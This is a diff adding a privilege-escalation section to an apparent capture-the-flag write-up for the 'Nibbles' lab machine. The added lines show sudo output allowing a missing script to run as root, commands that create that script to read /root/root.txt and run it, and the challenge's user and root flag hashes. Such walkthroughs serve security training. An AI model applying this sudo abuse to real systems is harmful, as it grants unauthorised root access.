@@ -334,11 +334,42 @@ cd /home/nibbler
 python3 -m http.server
 ```
 
+```
+   Date      Time    Attr         Size   Compressed  Name
+------------------- ----- ------------ ------------  ------------------------
+2017-12-10 19:58:10 D....            0            0  personal
+2017-12-10 20:05:23 D....            0            0  personal/stuff
+2015-05-08 00:17:29 .....         4015         1351  personal/stuff/monitor.sh
+------------------- ----- ------------ ------------  ------------------------
+```
+
+[monitor.sh](monitor.sh)
+
+```
+sudo -l
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+```
+
+interesting.. since that file doesn't currently exist, we can drop whatever contents we want.. right?
+
+```
+mkdir -p personal/stuff
+echo "/bin/cat /root/root.txt" >> personal/stuff/monitor.sh
+chmod +x personal/stuff/monitor.sh
+sudo /home/nibbler/personal/stuff/monitor.sh
+cd71c3483af2890056544b3ce1468961
+```
+
+nice.
 
 
 
 ## flag
 ```
-user:
-root:
+user:50899abf4d3b0f5de683dd1f6665c601
+root:cd71c3483af2890056544b3ce1468961
 ```
